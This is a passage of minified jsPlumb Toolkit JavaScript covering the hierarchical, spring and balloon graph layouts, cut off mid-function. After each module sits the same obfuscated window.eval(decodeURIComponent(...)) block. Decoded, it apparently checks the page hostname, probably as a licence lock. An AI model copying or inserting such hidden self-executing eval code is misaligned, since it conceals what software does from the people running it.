t||(t={nodes:[],pointer:0},u[n]=t),t}(e),s={node:n,parent:o,childGroup:i,loc:_.pointer,index:_.nodes.length,dimensions:t,size:t[r]},a=t[0==r?1:0];return null==w[e]?w[e]=a:w[e]=Math.max(w[e],a),_.pointer+=t[r]+d[r],_.nodes.push(s),s},j=function(n){if(n.size>0){var t=n.parent.loc+n.parent.size/2-(n.size-d[r])/2,e=c[n.depth],o=-1/0,i=0;if(null!=e&&e.length>0){var _=e[e.length-1],s=_.nodes[_.nodes.length-1];o=s.loc+s.size+d[r]}t>=o?n.loc=t:(i=o-t,n.loc=o);for(var a=n.loc,w=0;w<n.nodes.length;w++)n.nodes[w].loc=a,a+=n.nodes[w].size,a+=d[r];i>0&&f(n),function(n,t){var e=c[t];e||(e=[],c[t]=e),n.index=e.length,e.push(n)}(n,n.depth)}},p=function(n){var t=(n.nodes[0].loc+(n.nodes[n.nodes.length-1].loc+n.nodes[n.nodes.length-1].size))/2-n.parent.size/2,e=t-n.parent.loc;if(n.parent.loc=t,!n.parent.root)for(var o=n.parent.childGroup,i=n.parent.childGroupIndex+1;i<o.nodes.length;i++)o.nodes[i].loc+=e},f=function(n){for(var t=n;null!=t;)p(t),t=t.parent.childGroup},g=function(n,t){return t.source===n||t.source.getNode&&t.source.getNode()===n},m=function n(t,e){if(!_[t.node.id]){_[t.node.id]=!0;var o,i=s(t.node,a.toolkit),w={nodes:[],loc:0,size:0,parent:t,depth:e+1},l=[],u={};for(o=0;o<i.length;o++){var c=g(t.node,i[o])?i[o].target:i[o].source;if(c.getNode&&(c=c.getNode()),null!=(c=a.toolkit.getNode(c))&&c!==t.node&&!u[c.id]){var p=a.getSize(B(c)),f=h(c,p,e+1,t,w);f.childGroupIndex=w.nodes.length,w.nodes.push(f),w.size+=p[r]+d[r],l.push(f),u[c.id]=!0}}for(j(w),o=0;o<l.length;o++)n(l[o],e+1)}};this.defaultParameters={padding:[60,60],orientation:"horizontal",border:0,locationFunction:e.locationFunction};var v=this.begin;this.begin=function(n,t){v.apply(this,arguments),o=t.orientation,r=(i="horizontal"===o)?0:1,i?"width":"height",d=t.padding,u.length=0,c.length=0,_={},s=t.getChildEdges},this.step=function(n,e){for(var o,i,_,s=t.isArray(e.rootNode)?e.rootNode:[e.rootNode],c=0;c<s.length;c++){o=s[c];var j=a.getSize(o.id),p=h(o,j,0,null,null);p.root=!0,m(p,0);var f,g,v=0,C=function(n,t){var e=0==r?1:0;return l&&n.parent?a.getPosition(B(n.parent.node))[e]+n.parent.dimensions[e]+d[e]:t};for(i=0;i<u.length;i++){for(u[i].otherAxis=v,_=0;_<u[i].nodes.length;_++)f=0==r?u[i].nodes[_].loc:C(u[i].nodes[_],v),u[i].nodes[_].parent&&a.getPosition(B(u[i].nodes[_].parent.node)),g=1==r?u[i].nodes[_].loc:C(u[i].nodes[_],v),a.setPosition(B(u[i].nodes[_].node),f,g,!0);u[i].otherAxisSize=w[i]+d[0==r?1:0],v+=u[i].otherAxisSize}}a.setDone(!0)},this.getHierarchy=function(){return u},this.getOrientation=function(){return o};var C=this.nodeRemoved;this.nodeRemoved=function(){u=[],C.apply(this,arguments)},this.getPadding=function(){return d}},t.extend(n.Hierarchical,n.AbstractHierarchicalLayout)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){this.jsPlumbToolkit.Layouts.Decorators.Hierarchy=function(n){var t,e=[];this.reset=function(n){for(var t=0;t<e.length;t++)n.remove(e[t]);e.length=0},this.decorate=function(n){if(n.bounds[0]!=1/0){var e=n.layout.getHierarchy();t=(n.layout.getPadding()||[60,60])["horizontal"===o?0:1];for(var o=n.layout.getOrientation(),i="horizontal"===o?["width","height",n.bounds[2]-n.bounds[0]]:["height","width",n.bounds[3]-n.bounds[1]],r=0;r<e.length;r++){var d=document.createElement("div");n.append(d),d.className="level "+(r%2?"odd":"even"),d.style[i[0]]=i[2]+2*t+"px",d.style[i[1]]=e[r].otherAxisSize+"px";var _="horizontal"===o?[n.bounds[0]-t,e[r].otherAxis-t/2]:[e[r].otherAxis-t/2,n.bounds[1]-t];n.setAbsolutePosition(d,_)}}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit.Layouts,t=this.jsPlumbUtil;n.Spring=function(t){this.defaultMagnetized=!0;var e=n.AbsoluteBackedLayout.apply(this,arguments);this.defaultParameters={padding:[50,50],iterations:500,maxRepulsiveForceDistance:6,k:2,c:.01,maxVertexMovement:.5,locationFunction:t.locationFunction};var o,i=this.defaultParameters,r={},d=!1!==t.absoluteBacked,_=0,s=1/0,a=-1/0,w=1/0,l=-1/0,u=1,c=1,B=0,h=function(n){n.getNode&&(n=n.getNode());var t=r[n.id];if(!t){var o=e.getRandomPosition(n.id,.5,.5);t=r[n.id]={id:n.id,n:n,sp:o,p:[o[0],o[1]],f:[0,0]}}return t},j=function(n,t,e){s=Math.min(s,t),w=Math.min(w,e),a=Math.max(a,t),l=Math.max(l,e),n.p[0]=t,n.p[1]=e},p=function(n,t){if(!n.locked||!t.locked){var e=t.p[0]-n.p[0],o=t.p[1]-n.p[1],r=e*e+o*o;r<.01&&(r=(e=.1*Math.random()+.1)*e+(o=.1*Math.random()+.1)*o);var d=Math.sqrt(r);if(d<i.maxRepulsiveForceDistance){B++;var _=i.k*i.k/d,s=_*e/d,a=_*o/d;t.f[0]+=t.locked?0:(n.locked?2:1)*s,t.f[1]+=t.locked?0:(n.locked?2:1)*a,n.f[0]-=n.locked?0:(t.locked?2:1)*s,n.f[1]-=n.locked?0:(t.locked?2:1)*a}}},f=function(n,t){var e=h(t.target);if(!n.locked||!e.locked){B++;var o=e.p[0]-n.p[0],r=e.p[1]-n.p[1],d=o*o+r*r;d<.01&&(d=(o=.1*Math.random()+.1)*o+(r=.1*Math.random()+.1)*r);var _=Math.sqrt(d);_>i.maxRepulsiveForceDistance&&(d=(_=i.maxRepulsiveForceDistance)*_);var s=(d-i.k*i.k)/i.k;(void 0==t.weight||t.weight<1)&&(t.weight=1);var a=(s*=.5*Math.log(t.weight)+1)*o/_,w=s*r/_;e.f[0]-=e.locked?0:(n.locked?2:1)*a,e.f[1]-=e.locked?0:(n.locked?2:1)*w,n.f[0]+=n.locked?0:(e.locked?2:1)*a,n.f[1]+=n.locked?0:(e.locked?2:1)*w}},g=function(){for(var n in u=e.width/(a-s)*.62,c=e.height/(l-w)*.62,r){var t=r[n];t.locked||(t.sp=v(t.p),e.setPosition(t.id,t.sp[0],t.sp[1],!0))}},m=function(n){return[s+(n[0]-.19*e.width)/u,w+(n[1]-.19*e.height)/c]},v=function(n){return[.19*e.width+(n[0]-s)*u,.19*e.height+(n[1]-w)*c]};this._nodeMoved=this._groupMoved=function(n,t,e){var o=r[n];o&&(o.sp=[t,e],o.p=m(o.sp))},this.forceMagnetize=function(){for(var n in r)r[n].locked=!1},this.canMagnetize=function(n){return r[n]&&!0!==r[n].locked},this.reset=function(){r={},_=0,s=w=1/0,a=l=-1/0},this._nodeRemoved=this._groupRemoved=function(n){delete r[n]},this._nodeAdded=this._groupAdded=function(n,t){if(t&&t.position){var o=h(n.node||n.group);o&&(o.locked=!0,e.setPosition(o.id,t.position.left,t.position.top,!0))}},this.begin=function(n,t){_=0,o=[],Array.prototype.push.apply(o,e.adapter.getNodes()),Array.prototype.push.apply(o,e.adapter.getGroups())},this.step=function(n,t){var r,s=[],a=function(n){return s[n]?s[n]:(s[n]=h(o[n]),s[n])};for(B=0,r=0;r<o.length;r++){var w=a(r);if(!w.group){if(d&&!w.locked){var l=this.getAbsolutePosition(w.n,t);if(null!=l&&2===l.length&&null!=l[0]&&null!=l[1]&&!isNaN(l[0])&&!isNaN(l[1])){j(w,l[0],l[1]),w.sp=w.p,e.setPosition(w.id,l[0],l[1],!0),w.locked=!0;continue}}for(var u=r+1;u<o.length;u++){var c=a(u);p(w,c)}for(var m=e.toolkit.getAllEdgesFor(w.n),v=0;v<m.length;v++)f(w,m[v])}}if(0!==B)for(r=0;r<o.length;r++){var C=a(r);if(!C.group){var b=i.c*C.f[0],y=i.c*C.f[1],D=i.maxVertexMovement;b>D&&(b=D),b<-D&&(b=-D),y>D&&(y=D),y<-D&&(y=-D),j(C,C.p[0]+b,C.p[1]+y),C.f[0]=0,C.f[1]=0}}_++,(0==B||_>=i.iterations)&&(g(),e.setDone(!0))},this.end=function(){for(var n in r)r[n].locked=!0}},t.extend(n.Spring,n.AbsoluteBackedLayout)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit.Layouts,t=this.Farahey;n.Balloon=function(e){e=e||{};var o,i=n.AbstractHierarchicalLayout.apply(this,arguments),r=[];this.defaultParameters={padding:50,locationFunction:e.locationFunction,groupPadding:100};var d=t.getInstance({padding:[100,100],getPosition:function(n){return{left:n.extents[0],top:n.extents[2]}},setPosition:function(n,t){for(var e=0;e<n.group.length;e++){var o=n.offsets[n.group[e].id];n.setPosition(n.group[e].id,t.left+o.left,t.top+o.top)}},getSize:function(n){return[n.extents[1]-n.extents[0],n.extents[3]-n.extents[2]]},getId:function(n){return n.focus.id},filter:function(n){return r[0].focus.id!==n}}),_=this.begin;this.begin=function(n,t){_.apply(this,arguments),r.length=0,o=t.getChildEdges};var s=function n(e,d,_){var s,a,w,l,u,c,B=function(n,t,e,o){return{x:n-_.padding,y:t-_.padding,w:e+2*_.padding,h:o+2*_.padding}},h={focus:e,childMap:{},children:[],positions:{},incidentAngles:[],setPosition:function(n,t,e){this.positions[n]=[t,e]},getPosition:function(n){return this.positions[n]},setIncidentAngle:function(n,t){this.incidentAngles[n]=t},group:[e]},j=d?d.position:[0,0],p=j[0],f=j[1],g={},m=function(n){return g[n]||(g[n]=i.getSize(n),g[n])};h.setPosition(e.id,j[0],j[1]);var v=o(e);for(s=0;s<v.length;s++)h.childMap[v[s].target.id]||(h.childMap[v[s].target.id]=!0,h.children.push(v[s].target));if(l=m(h.focus.id),w=Math.max(l[0],l[1]),c=B(p-l[0]/2,f-l[1]/2,l[0],l[1]),i.setPosition(h.focus.id,-l[0]/2,-l[1]/2,!0),h.children.length>0){r.push(h);var C=2*Math.PI/(h.children.length+(d?1:0)),b=d?d.incidentAngle+Math.PI+C:Math.PI,y=b;for(s=0;s<h.children.length;s++){u=m((a=h.children[s]).id);var D=B(p+Math.sin(b)*u[0],f+Math.cos(b)*u[1],u[0],u[1]);if(M=t.calculateSpacingAdjustment(c,D),F=Math.sqrt(Math.pow(D.x+M.left-p,2)+Math.pow(D.y+M.top-f,2)),w=Math.max(w,F),h.setPosition(a.id,D.x+M.left,D.y+M.top),b+=C,s>0){var P=h.children[s-1],E=m(P.id),x=h.getPosition(P.id),A=B(x[0],x[1],E[0],E[1]),S=h.children[s],I=m(S.id),k=h.getPosition(S.id),T=B(k[0],k[1],I[0],I[1]),M=t.calculateSpacingAdjustment(A,T),N=[x[0]+E[0]/2,x[1]+E[1]/2],O=[k[0]+M.left+I[0]/2,k[1]+M.top+ +I[1]/2],F=Math.sqrt(Math.pow(N[0]-O[0],2)+Math.pow(N[1]-O[1],2));w=Math.max(w,F/2/Math.sin(C/2))}}for(b=y,s=0;s<h.children.length;s++)a=h.children[s],h.setIncidentAngle(a.id,b),h.setPosition(a.id,p+Math.sin(b)*w,f+Math.cos(b)*w,!0),b+=C;var 